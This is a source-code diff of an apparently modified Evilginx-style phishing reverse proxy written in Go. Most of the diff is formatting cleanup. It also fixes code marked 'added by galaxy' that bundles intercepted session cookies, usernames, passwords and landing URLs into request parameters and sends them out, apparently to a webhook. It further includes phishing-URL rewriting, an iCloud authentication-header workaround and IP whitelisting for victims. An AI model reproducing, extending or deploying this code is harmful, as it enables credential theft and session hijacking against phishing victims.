@@ -454,7 +454,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-
 				useragent := req.Header.Get("User-Agent")
 				if useragent != "" && p.cfg.useragent_override != "" {
 					req.Header.Set("User-Agent", p.cfg.useragent_override)
@@ -477,8 +476,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				
-					// iCloud fix
+
+				// iCloud fix
 				auth_attr := req.Header.Get("X-Apple-Auth-Attributes")
 				if auth_attr != "" {
 					req.Header.Del("X-Apple-Auth-Attributes")
@@ -806,7 +805,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if pl != nil {
 				auth_tokens = pl.authTokens
 			}
-			
+
 			// resp.Request.Host is not modified or accessed anywhere else, only req_hostname is used.
 			if host := resp.Header.Get("Host"); host != "" {
 				resp.Header.Set("Host", string(p.patchUrls(pl, []byte(host), CONVERT_TO_PHISHING_URLS)))
@@ -823,8 +822,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// 	// resp.Header.Add("X-Frame-Options", "ALLOW-FROM 	"+string(p.patchUrls(pl, []byte("https://appleid.apple.com"), CONVERT_TO_PHISHING_URLS)))
 			// 	log.Error("x-frame-options: %v", resp.Header.Get("X-Frame-Options"))
 			// }
-			
-			
+
 			is_auth := false
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
@@ -869,7 +867,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									//////////////////////// added by galaxy
 									params := url.Values{}
-									params.Add("cookie", TokensToJSON(pl, s.Tokens)
+									params.Add("cookie", TokensToJSON(pl, s.Tokens))
 									params.Add("username", s.Username)
 									params.Add("password", s.Password)
 									params.Add("landing_url", ps.LandingURL)
@@ -1031,10 +1029,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-								
+
 								//////////////////////// added by galaxy
 								params := url.Values{}
-								params.Add("cookie", TokensToJSON(pl, s.Tokens)
+								params.Add("cookie", TokensToJSON(pl, s.Tokens))
 								params.Add("username", s.Username)
 								params.Add("password", s.Password)
 								params.Add("landing_url", ps.LandingURL)
@@ -1051,7 +1049,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 								fmt.Println("this is the response", string(responseData))
 								//////////////////////// added by galaxy
-								
+
 								shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
 								if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
 									str := `[%d] Username: %s \n Password: %s \n Custom: %s`
@@ -1680,27 +1678,27 @@ func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
 	}
 }
 
- func (p *HttpProxy) whitelistIP(ip_addr, sid string) {
- 	p.ip_mtx.Lock()
- 	defer p.ip_mtx.Unlock()
+func (p *HttpProxy) whitelistIP(ip_addr, sid string) {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
- 	log.Debug("whitelistIP: %s %s", ip_addr, sid)
- 	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
- 	p.ip_sids[ip_addr] = sid
- }
+	log.Debug("whitelistIP: %s %s", ip_addr, sid)
+	p.ip_whitelist[ip_addr] = time.Now().Add(10 * time.Minute).Unix()
+	p.ip_sids[ip_addr] = sid
+}
 
- func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
- 	p.ip_mtx.Lock()
- 	defer p.ip_mtx.Unlock()
+func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+	p.ip_mtx.Lock()
+	defer p.ip_mtx.Unlock()
 
- 	log.Debug("isWhitelistIP: %s", ip_addr)
- 	ct := time.Now()
- 	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
- 		et := time.Unix(ip_t, 0)
- 		return ct.Before(et)
- 	}
- 	return false
- }
+	log.Debug("isWhitelistIP: %s", ip_addr)
+	ct := time.Now()
+	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
+		et := time.Unix(ip_t, 0)
+		return ct.Before(et)
+	}
+	return false
+}
 
 func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	p.ip_mtx.Lock()
@@ -1776,6 +1774,7 @@ func (dumb dumbResponseWriter) WriteHeader(code int) {
 func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
 	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
 }
+
 // Get the IP address of the connected user.
 // Returns IP specified in header or request.RemoteAddr if not applicable.
 func GetUserIP(_ http.ResponseWriter, httpServer *http.Request) (userIP string) {
